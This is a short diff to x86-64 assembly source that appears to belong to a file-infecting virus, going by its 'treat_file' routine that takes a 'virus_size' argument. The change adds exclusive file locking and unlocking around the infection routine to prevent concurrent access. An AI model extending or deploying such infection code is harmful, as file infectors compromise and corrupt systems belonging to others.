@@ -116,7 +116,14 @@ _treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *fu
 	cmp rax, -1
 	jle _not_ok_end
 	mov QWORD [rsp], rax ; store the fd
-	mov rdi, rax
+
+	; Now we lock the file to avoid concurrence
+	mov rax, SYS_FLOCK
+	mov rdi, QWORD [rsp]
+	mov rsi, LOCK_EX
+	syscall
+
+	mov rdi, QWORD [rsp]
 		mov r10, QWORD [rsp + 96]
 		sub rsp, r10
 		sub rsp, 8
@@ -283,6 +290,12 @@ _munmap:
 ;;;;;;;;;;;;;;;;;;;;;;;;
 ; close file
 _close_file:
+	; But first, unlock it
+	mov rax, SYS_FLOCK
+	mov rdi, QWORD [rsp]
+	mov rsi, LOCK_UN
+	syscall
+
 	mov rax, SYS_CLOSE
 	mov rdi, QWORD [rsp]
 	syscall
